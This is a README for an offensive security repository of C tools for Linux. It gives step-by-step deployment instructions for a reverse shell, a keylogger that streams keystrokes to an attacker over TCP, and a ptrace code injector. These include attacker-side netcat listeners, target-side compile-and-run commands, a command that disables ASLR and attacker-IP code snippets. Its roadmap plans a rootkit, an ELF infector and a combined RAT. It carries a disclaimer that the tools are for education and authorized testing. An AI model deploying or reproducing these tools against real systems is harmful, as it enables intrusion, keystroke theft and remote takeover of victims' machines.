# 4some

A collection of offensive security tools written in C for Linux, built from scratch as a learning project. Each program is a standalone module — no dependencies, no libraries, just raw syscalls.

> **This repo is actively updated. More modules coming.**

---

## ⚠️ Disclaimer

These tools are for **educational purposes and authorized testing only**. Only use them on systems you own or have explicit permission to test. Unauthorized use is illegal.

---

## Modules

| File | Description | Status |
|---|---|---|
| `reverse_shell.c` | Connects back to attacker and hands over a shell | ✅ Done |
| `keylogger.c` | Reads raw keyboard input and streams it over network | ✅ Done |
| `injector.c` | Injects code into a running process using ptrace | ✅ Done |
| ELF infector | Patches ELF binaries to inject payload at entry point | 🔜 Planned |
| Rootkit (LKM) | Kernel module that hides files and processes | 🔜 Planned |

---

## Requirements

- Linux (tested on EndeavourOS / Arch-based)
- GCC
- Root privileges for keylogger and injector

---

## 1. Reverse Shell

Connects to an attacker-controlled listener and spawns `/bin/sh` over the socket.

**Edit the IP and port before compiling:**
```c
// in reverse_shell.c
inet_pton(AF_INET, "YOUR_IP_HERE", &addr.sin_addr);
addr.sin_port = htons(YOUR_PORT);
```

**On the attacker machine — start listener:**
```
nc -lvnp 8080
```

**Compile and run on target:**
```
gcc -o reverse_shell reverse_shell.c
./reverse_shell
```

You will get a shell in your netcat terminal.

---

## 2. Keylogger

Reads raw keyboard events from `/dev/input/eventX` and streams keypresses over TCP to the attacker.

**Find your keyboard device first:**
```
cat /proc/bus/input/devices | grep -A 5 "keyboard"
```
Look for the line with `Handlers=kbd eventX` — that X is your device number.

**Edit the device path and attacker IP before compiling:**
```c
// in keylogger.c
int fd = open("/dev/input/event3", O_RDONLY);  // change event3 to your device
inet_pton(AF_INET, "YOUR_IP_HERE", &addr.sin_addr);
addr.sin_port = htons(YOUR_PORT);
```

**On the attacker machine — start listener:**
```
nc -lvnp 8080
```

**Compile and run on target (requires root):**
```
gcc -o keylogger keylogger.c
sudo ./keylogger
```

Keypresses will appear in your netcat terminal in real time.

---

## 3. Process Injector (ptrace)

Attaches to a running process and overwrites a target instruction with NOPs using ptrace. Kills the target's execution flow.

**Requires ASLR to be disabled (for hardcoded addresses):**
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

**Find the target instruction address:**
```
objdump -d -M intel ./target_binary    # find the instruction offset
cat /proc/$(pidof target_binary)/maps  # find the r-xp region base and file offset
python3 -c "print(hex(BASE - FILE_OFFSET + OBJDUMP_OFFSET))"  # calculate runtime address
```

**Edit the address in injector.c:**
```c
ptrace(PTRACE_POKEDATA, target, (void*)0xYOUR_ADDRESS, (void*)0x9090909090909090);
```

**Compile:**
```
gcc -o injector injector.c
```

**Run against target PID:**
```
./target_binary &
./injector $(pidof target_binary)
```

> Note: The injector is intentionally target-specific. Addresses change per binary. Future version will include dynamic address resolution via `/proc/PID/maps`.

---

## Roadmap

- [x] Reverse shell
- [x] Keylogger
- [x] Process injector (basic)
- [ ] Process injector with dynamic address resolution
- [ ] Daemonize module (background persistence)
- [ ] ELF infector
- [ ] Rootkit (LKM)
- [ ] Combine reverse shell + keylogger into unified RAT

---

## License

GPL-3.0 — see [LICENSE](LICENSE)
